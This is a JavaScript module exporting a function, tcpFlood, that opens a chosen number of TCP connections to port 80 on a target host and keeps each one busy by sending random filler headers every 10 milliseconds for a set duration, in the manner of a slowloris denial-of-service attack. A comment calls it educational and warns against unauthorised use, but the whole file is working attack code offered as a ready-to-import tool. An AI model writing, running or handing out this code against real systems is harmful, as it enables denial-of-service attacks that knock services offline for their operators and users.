import net from 'net';

/**
 * Performs a TCP flood attack on a target.  This function is intended for educational/testing purposes ONLY.
 * Using this function against systems without explicit permission is illegal and unethical.
 *
 * @param {string} target The target hostname or IP address.
 * @param {number} threads The number of concurrent TCP connections to establish. Defaults to 10.
 * @param {number} duration The duration of the flood in seconds. Defaults to 60.
 */
async function tcpFlood(target, threads = 10, duration = 60) {
  if (!target) {
    console.error("Target hostname or IP address is required for TCP flood.");
    return;
  }

  if (threads <= 0) {
    console.warn("Number of threads must be greater than 0. Using default value of 10.");
    threads = 10;
  }

  if (duration <= 0) {
    console.warn("Duration must be greater than 0. Using default value of 60 seconds.");
    duration = 60;
  }

  console.log(`Starting TCP flood attack on ${target} with ${threads} threads for ${duration} seconds.`);

  const sockets = [];

  for (let i = 0; i < threads; i++) {
    try {
      const socket = net.createConnection({ host: target, port: 80 }, () => { // Defaulting to port 80.  Allowing specific port config would be ideal.
        console.log(`Thread ${i + 1}: Connected to ${target}`);

        sockets.push(socket);

        // Send junk data continuously
        socket.write("GET / HTTP/1.1\r\n"); // Basic HTTP request to keep connection alive.  Can be modified.
        socket.write("Host: " + target + "\r\n");
        socket.write("Connection: keep-alive\r\n");
        socket.write("User-Agent: TCPFloodBot\r\n");
        socket.write("\r\n");

        const intervalId = setInterval(() => {
          try {
            //Keep alive
             socket.write("X-Filler: " + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + "\r\n");
          } catch (err) {
            console.error(`Thread ${i + 1}: Error sending data: ${err.message}`);
            clearInterval(intervalId);
            socket.destroy();
          }
        }, 10);

        // Close the socket after the specified duration
        setTimeout(() => {
          console.log(`Thread ${i + 1}: Closing connection after ${duration} seconds.`);
          clearInterval(intervalId);
          socket.destroy();
          sockets.splice(sockets.indexOf(socket), 1); // Remove the socket from the array
        }, duration * 1000);
      });


      socket.on('error', (err) => {
        console.error(`Thread ${i + 1}: Socket error: ${err.message}`);
        socket.destroy();
        if (sockets.includes(socket)) {
            sockets.splice(sockets.indexOf(socket), 1);
        }
      });

      socket.on('close', () => {
        console.log(`Thread ${i + 1}: Connection closed.`);
        if (sockets.includes(socket)) {
            sockets.splice(sockets.indexOf(socket), 1);
        }
      });

    } catch (socketError) {
      console.error(`Error creating socket for thread ${i + 1}:`, socketError);
    }
  }

  // Stop the flood after the specified duration
  setTimeout(() => {
    console.log("Stopping TCP flood.");
    sockets.forEach(socket => {
        try {
            socket.destroy();
        } catch (e) {
            console.error("Error destroying socket:", e);
        }

    });
  }, duration * 1000);
}

export { tcpFlood };